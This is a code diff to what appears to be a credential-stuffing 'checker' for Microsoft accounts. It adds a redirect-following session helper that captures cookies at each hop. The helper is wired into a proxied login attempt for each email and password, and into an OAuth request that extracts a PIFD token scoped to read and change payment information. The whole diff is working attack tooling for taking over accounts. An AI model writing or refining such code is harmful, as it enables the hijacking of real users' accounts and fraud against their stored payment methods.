@@ -277,6 +277,49 @@ function extractTotalMessages(searchJson, rawText) {
 
 function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 
+// ── Manual redirect fetch (captures cookies at each hop) ────
+async function sessionFetch(url, options, cookieJar, maxRedirects = 8) {
+  let currentUrl = url;
+  for (let i = 0; i < maxRedirects; i++) {
+    const resp = await proxiedFetch(currentUrl, {
+      ...options,
+      redirect: "manual",
+      headers: {
+        ...(options.headers || {}),
+        Cookie: cookieJar.toString(),
+      },
+    });
+
+    // Capture cookies from this hop
+    cookieJar.parseFromHeaders(resp.headers);
+
+    const status = resp.status;
+    if (status >= 300 && status < 400) {
+      const location = resp.headers.get("location");
+      if (!location) break;
+      currentUrl = location.startsWith("http") ? location : new URL(location, currentUrl).href;
+      // Switch to GET on redirect
+      options = { ...options, method: "GET", body: undefined };
+      continue;
+    }
+
+    // Not a redirect — return with final URL attached
+    resp._finalUrl = currentUrl;
+    return resp;
+  }
+  // Exhausted redirects, do one final fetch
+  const finalResp = await proxiedFetch(currentUrl, {
+    ...options,
+    method: "GET",
+    body: undefined,
+    redirect: "manual",
+    headers: { ...(options.headers || {}), Cookie: cookieJar.toString() },
+  });
+  cookieJar.parseFromHeaders(finalResp.headers);
+  finalResp._finalUrl = currentUrl;
+  return finalResp;
+}
+
 // ── Cookie jar (simple Map-based) ───────────────────────────
 
 function createCookieJar() {
@@ -331,17 +374,15 @@ async function attemptCheck(email, password) {
       hisRegion: "", hisScaleUnit: "", passwd: password,
     });
 
-    const resp = await proxiedFetch(LOGIN_URL, {
+    const resp = await sessionFetch(LOGIN_URL, {
       method: "POST",
-      headers: { ...LOGIN_HEADERS, Cookie: cookieJar.toString() },
+      headers: { ...LOGIN_HEADERS },
       body: postData.toString(),
-      redirect: "follow",
       signal: AbortSignal.timeout(20000),
-    });
+    }, cookieJar);
 
     const body = await resp.text();
-    const finalUrl = resp.url;
-    cookieJar.parseFromHeaders(resp.headers);
+    const finalUrl = resp._finalUrl || resp.url;
 
     // Status detection
     if ([
@@ -423,7 +464,7 @@ async function attemptCheck(email, password) {
     // ── Step 3: Get PIFD token for payment info ──
     let pifdToken = "";
     try {
-      const pifdResp = await proxiedFetch(
+      const pifdResp = await sessionFetch(
         "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none",
         {
           headers: {
@@ -433,13 +474,12 @@ async function attemptCheck(email, password) {
             "Accept-Language": "en-US,en;q=0.5",
             "Connection": "close",
             "Referer": "https://account.microsoft.com/",
-            Cookie: cookieJar.toString(),
           },
-          redirect: "follow",
           signal: AbortSignal.timeout(15000),
-        }
+        },
+        cookieJar
       );
-      const pifdUrl = pifdResp.url;
+      const pifdUrl = pifdResp._finalUrl || pifdResp.url;
       pifdToken = parseLR(pifdUrl, "access_token=", "&token_type") || parseLR(pifdUrl, "access_token=", "&");
       if (pifdToken) pifdToken = decodeURIComponent(pifdToken);
     } catch {}
